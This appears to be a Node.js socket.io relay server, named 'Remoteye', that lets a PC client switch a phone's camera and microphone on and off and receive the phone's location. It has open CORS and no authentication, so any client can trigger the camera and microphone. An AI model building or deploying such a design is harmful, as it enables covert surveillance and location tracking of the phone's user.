const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

let estadoDispositivo = {
  conectado: false,
  camaraActiva: false,
  microfonoActivo: false,
  ubicacion: 'Desconocida',
  ultimoLatido: null,
};

io.on('connection', (socket) => {
  console.log('Nueva conexion:', socket.id);

  socket.on('identificar', (data) => {
    if (data.tipo === 'telefono') {
      socket.join('telefono');
      estadoDispositivo.conectado = true;
      console.log('Telefono conectado');
      io.to('pc').emit('telefono_conectado', estadoDispositivo);
    }
    if (data.tipo === 'pc') {
      socket.join('pc');
      console.log('PC conectada');
      socket.emit('estado_actual', estadoDispositivo);
    }
  });

  socket.on('ubicacion', (data) => {
    estadoDispositivo.ubicacion = data.lugar;
    io.to('pc').emit('ubicacion_actualizada', data);
  });

  socket.on('latido', (data) => {
    estadoDispositivo.ultimoLatido = new Date().toISOString();
    io.to('pc').emit('latido', data);
  });

  socket.on('activar_camara', () => {
    estadoDispositivo.camaraActiva = true;
    io.to('telefono').emit('comando', { accion: 'activar_camara' });
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('detener_camara', () => {
    estadoDispositivo.camaraActiva = false;
    io.to('telefono').emit('comando', { accion: 'detener_camara' });
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('activar_microfono', () => {
    estadoDispositivo.microfonoActivo = true;
    io.to('telefono').emit('comando', { accion: 'activar_microfono' });
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('detener_microfono', () => {
    estadoDispositivo.microfonoActivo = false;
    io.to('telefono').emit('comando', { accion: 'detener_microfono' });
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('disconnect', () => {
    console.log('Desconectado:', socket.id);
    estadoDispositivo.conectado = false;
    io.to('pc').emit('telefono_desconectado');
  });
});

app.get('/', (req, res) => {
  res.json({
    status: 'Remoteye server corriendo',
    dispositivo: estadoDispositivo
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});